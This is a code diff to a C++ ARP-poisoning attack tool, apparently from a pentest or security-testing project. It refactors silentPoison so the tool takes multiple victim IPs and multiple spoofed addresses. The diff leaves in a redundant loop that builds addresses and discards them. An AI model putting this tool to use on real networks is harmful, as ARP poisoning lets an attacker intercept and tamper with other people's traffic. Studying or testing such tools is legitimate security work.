@@ -8,6 +8,7 @@
 #include "arp_poisoning/silent.h"
 #include <memory>
 #include <stdexcept>
+#include <string>
 #include <utility>
 
 /**
@@ -49,18 +50,26 @@ void ATK::ARP::silentPoison(const SilentPoisoningOptions &options) {
                                     " is not a valid interface");
     }
 
-    const pcpp::IPv4Address ipToSpoof(options.ipToSpoof);
+    for (const std::string &ipToSpoofStr : options.ipsToSpoof) {
 
-    ATK::ARP::SilentArpPoisoningStrategy::Builder builder(device, ipToSpoof);
+        const pcpp::IPv4Address ipToSpoof(ipToSpoofStr);
+    }
+
+    ATK::ARP::SilentArpPoisoningStrategy::Builder builder(device);
 
     if (options.attackerMac.has_value()) {
         const pcpp::MacAddress macAddress(options.attackerMac.value());
         builder = builder.attackerMac(macAddress);
     }
 
-    if (options.victimIp.has_value()) {
-        const pcpp::IPv4Address victimIp(options.victimIp.value());
-        builder = builder.victimIp(victimIp);
+    for (const std::string &victimIpStr : options.victimIps) {
+        const pcpp::IPv4Address victimIp(victimIpStr);
+        builder.addVictimIp(victimIp);
+    }
+
+    for (const std::string &ipToSpoofStr : options.ipsToSpoof) {
+        const pcpp::IPv4Address ipToSpoof(ipToSpoofStr);
+        builder = builder.addIpToSpoof(ipToSpoof);
     }
 
     std::unique_ptr<ATK::ARP::SilentArpPoisoningStrategy> strategy =
